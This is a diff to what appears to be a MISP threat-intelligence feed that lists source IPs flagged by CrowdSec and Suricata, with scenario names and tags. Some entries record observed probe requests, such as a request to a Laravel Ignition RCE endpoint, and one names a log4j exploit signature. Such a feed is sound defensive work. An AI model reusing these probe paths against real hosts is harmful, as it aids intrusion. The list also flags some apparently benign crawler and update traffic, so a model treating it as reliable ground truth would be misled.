+            "relationship_type": null
+          },
+          {
+            "id": "8",
+            "name": "mwl:scanner=\"censys\"",
+            "colour": "#add377",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3329,15 +4775,45 @@
         "to_ids": true,
         "uuid": "995ce9b5-0612-4ddb-8667-15be14309caa",
         "distribution": "5",
-        "timestamp": "1776992292",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-23T21:02:15Z | last_seen: 2026-04-23T21:02:15Z | hits: 1 | scenarios: crowdsec/http-cve-probing",
+        "timestamp": "1777290767",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-23T21:02:15Z | last_seen: 2026-04-23T21:02:15Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (20.64.0.0/10) | scenarios: crowdsec/http-cve-probing",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "20.65.219.43",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3345,15 +4821,45 @@
         "to_ids": true,
         "uuid": "3093b49e-ea4a-4595-a671-5efdd5f03a87",
         "distribution": "5",
-        "timestamp": "1776992293",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-23T20:54:28Z | last_seen: 2026-04-23T20:54:28Z | hits: 1 | scenarios: crowdsec/http-probing",
+        "timestamp": "1777290767",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-23T20:54:28Z | last_seen: 2026-04-23T20:54:28Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (20.192.0.0/10) | scenarios: crowdsec/http-probing",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "20.211.123.94",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3361,15 +4867,45 @@
         "to_ids": true,
         "uuid": "90d09e79-e79f-47e8-8517-587d420c1f82",
         "distribution": "5",
-        "timestamp": "1776992293",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-23T13:32:36Z | last_seen: 2026-04-23T13:32:39Z | hits: 3 | scenarios: crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777290767",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-23T13:32:36Z | last_seen: 2026-04-23T13:32:39Z | hits: 3 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (158.158.0.0/16) | scenarios: crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "158.158.109.204",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3377,15 +4913,45 @@
         "to_ids": true,
         "uuid": "3cfce0bd-c4ca-4e32-93b4-e12a2dcec3a9",
         "distribution": "5",
-        "timestamp": "1777035611",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-24T11:21:48Z | last_seen: 2026-04-24T11:21:50Z | hits: 3 | scenarios: crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777290768",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-24T11:21:48Z | last_seen: 2026-04-24T11:21:50Z | hits: 3 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (158.158.0.0/16) | scenarios: crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "158.158.124.89",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3393,15 +4959,45 @@
         "to_ids": true,
         "uuid": "2ae5dd97-029a-4c13-a65e-a0299c5f74cf",
         "distribution": "5",
-        "timestamp": "1777035612",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-24T07:42:55Z | last_seen: 2026-04-24T07:43:16Z | hits: 3 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-sensitive-files",
+        "timestamp": "1777290768",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-24T07:42:55Z | last_seen: 2026-04-24T07:43:16Z | hits: 3 | AS16509 AMAZON-02 - Amazon.com (54.219.0.0/17) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-sensitive-files",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "54.219.20.110",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "12",
+            "name": "mwl:cloud=\"aws\"",
+            "colour": "#d5cf47",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3409,15 +5005,45 @@
         "to_ids": true,
         "uuid": "de8f845e-3458-439d-9169-8a30f83f8a96",
         "distribution": "5",
-        "timestamp": "1777035612",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-24T06:44:44Z | last_seen: 2026-04-24T06:44:45Z | hits: 3 | scenarios: crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777290768",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-24T06:44:44Z | last_seen: 2026-04-24T06:44:45Z | hits: 3 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (51.103.0.0/16) | scenarios: crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "51.103.42.147",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3425,15 +5051,45 @@
         "to_ids": true,
         "uuid": "4d6b0d5e-9a0e-4647-914b-0005de5586dd",
         "distribution": "5",
-        "timestamp": "1777035613",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-24T01:30:29Z | last_seen: 2026-04-24T01:30:41Z | hits: 3 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-sensitive-files",
+        "timestamp": "1777290769",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-24T01:30:29Z | last_seen: 2026-04-24T01:30:41Z | hits: 3 | AS14618 AMAZON-AES - Amazon.com (100.48.0.0/12) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-sensitive-files",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "100.53.147.39",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "12",
+            "name": "mwl:cloud=\"aws\"",
+            "colour": "#d5cf47",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -3441,15 +5097,1753 @@
         "to_ids": true,
         "uuid": "69ad1226-9728-49a4-8d74-9559392f06b2",
         "distribution": "5",
-        "timestamp": "1777035614",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-24T01:23:31Z | last_seen: 2026-04-24T01:23:34Z | hits: 5 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777290769",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-24T01:23:31Z | last_seen: 2026-04-24T01:23:34Z | hits: 5 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (20.150.0.0/15) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "20.151.131.235",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "d65f00bb-f705-49c0-8540-fae9f9bafbd6",
+        "distribution": "5",
+        "timestamp": "1777078892",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-24T15:54:43Z | last_seen: 2026-04-24T15:54:43Z | hits: 1 | AS14618 AMAZON-AES - Amazon.com (3.80.0.0/12) | scenarios: crowdsec/http-cve-probing | payloads: GET /_ignition/execute-solution",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "3.84.30.251",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "12",
+            "name": "mwl:cloud=\"aws\"",
+            "colour": "#d5cf47",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "a19a913a-a7fa-4eeb-8481-743892cbbcac",
+        "distribution": "5",
+        "timestamp": "1777122024",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T00:40:08Z | last_seen: 2026-04-25T00:40:08Z | hits: 2 | AS53667 PONYNET - FranTech Solutions (107.189.0.0/21) | scenarios: suricata/ET TOR Known Tor Exit Node Traffic group 7",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "107.189.4.12",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "13",
+            "name": "tor:exit-node",
+            "colour": "#3f0f0c",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "ade336ec-dac7-418d-9d93-f83f13f4c192",
+        "distribution": "5",
+        "timestamp": "1777122024",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T22:46:34Z | last_seen: 2026-04-24T22:46:34Z | hits: 1 | AS53667 PONYNET - FranTech Solutions (107.189.30.0/23) | scenarios: suricata/ET TOR Known Tor Exit Node Traffic group 7",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "107.189.31.52",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "13",
+            "name": "tor:exit-node",
+            "colour": "#3f0f0c",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "a102aed6-e695-4309-b065-b8bcbb7756fc",
+        "distribution": "5",
+        "timestamp": "1777122025",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T22:46:29Z | last_seen: 2026-04-24T22:46:29Z | hits: 1 | AS215125 CYBEROLOGY-AS - Church of Cyberology (192.42.116.0/24) | scenarios: suricata/ET TOR Known Tor Exit Node Traffic group 56",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "192.42.116.144",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "13",
+            "name": "tor:exit-node",
+            "colour": "#3f0f0c",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "954dcb5e-d200-40ec-8a6b-7c202e80a708",
+        "distribution": "5",
+        "timestamp": "1777122025",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T20:23:01Z | last_seen: 2026-04-24T20:23:01Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /d/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.275.0_7df8d19a59bd1c63d570adf1317e94932554f9df.exe?cacheHostOrigin=4.au.download.windowsupdate.com",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "172.189.127.16",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "4d92d972-c7f3-44de-9a8d-6b5e6d40732b",
+        "distribution": "5",
+        "timestamp": "1777078899",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T19:39:11Z | last_seen: 2026-04-24T19:39:11Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (52.160.0.0/11) | scenarios: suricata/ET SCAN Bing Webcrawler User-Agent (BingBot) | payloads: GET /",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "52.167.144.167",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "bc1cd823-f012-4f91-9811-cd4dee1a3837",
+        "distribution": "5",
+        "timestamp": "1777078900",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T19:39:08Z | last_seen: 2026-04-24T19:39:08Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (40.76.0.0/14) | scenarios: suricata/ET SCAN Bing Webcrawler User-Agent (BingBot) | payloads: GET /robots.txt",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "40.77.167.108",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "577e77bf-aaad-46b4-a93f-9d90a8dc46db",
+        "distribution": "5",
+        "timestamp": "1777078901",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T19:19:52Z | last_seen: 2026-04-24T19:19:52Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /d/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.270.0_13d830d70f31d65754493e4507e88db90ef3ee9f.exe?cacheHostOrigin=2.au.download.windowsupdate.com",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "172.189.127.20",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "f348105a-98e3-460a-97d8-73548c5b108f",
+        "distribution": "5",
+        "timestamp": "1777078903",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T18:08:42Z | last_seen: 2026-04-24T18:08:42Z | hits: 1 | AS396982 GOOGLE-CLOUD-PLATFORM - Google LLC (35.192.128.0/20) | scenarios: suricata/ET SCAN WordPress Scanner Performing Multiple Requests to Windows Live Writer XML | payloads: GET /wordpress/wp-includes/wlwmanifest.xml",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "35.192.131.2",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "11",
+            "name": "mwl:cloud=\"gcp\"",
+            "colour": "#fb8535",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "dcf593b0-8ad2-446d-8010-ad69821e0466",
+        "distribution": "5",
+        "timestamp": "1777078904",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T17:21:00Z | last_seen: 2026-04-24T17:21:00Z | hits: 1 | AS12322 PROXAD - Free SAS (212.27.32.0/19) | scenarios: suricata/SURICATA IKE weak cryptographic parameters (Diffie-Hellman)",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "212.27.34.147",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "228a83fd-bc27-4e8d-8853-c47cb74ba386",
+        "distribution": "5",
+        "timestamp": "1777078905",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T16:32:17Z | last_seen: 2026-04-24T16:32:17Z | hits: 1 | AS212238 CDNEXT - Datacamp Limited (89.222.96.0/23) | scenarios: suricata/ET EXPLOIT Possible Apache log4j RCE Attempt - 2021/12/12 Obfuscation Observed M2 (udp) (Outbound) (CVE-2021-44228)",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "89.222.96.1",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "4dc5b059-bacc-431c-bd38-8a9640712df1",
+        "distribution": "5",
+        "timestamp": "1777078906",
+        "comment": "Sources: suricata | first_seen: 2026-04-24T14:50:15Z | last_seen: 2026-04-24T14:50:15Z | hits: 1 | AS12322 PROXAD - Free SAS (212.27.32.0/19) | scenarios: suricata/SURICATA IKE weak cryptographic parameters (Diffie-Hellman)",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "212.27.34.146",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "cf58d569-b123-4450-b0a7-549315ec6bac",
+        "distribution": "5",
+        "timestamp": "1777122026",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T00:40:15Z | last_seen: 2026-04-25T00:40:15Z | hits: 2 | AS60729 TORSERVERS-NET - Stiftung Erneuerbare Freiheit (185.220.101.0/24) | scenarios: suricata/ET TOR Known Tor Exit Node Traffic group 32",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "185.220.101.104",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "13",
+            "name": "tor:exit-node",
+            "colour": "#3f0f0c",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "3001fc90-98b0-4574-8e3f-f9a99a751689",
+        "distribution": "5",
+        "timestamp": "1777208416",
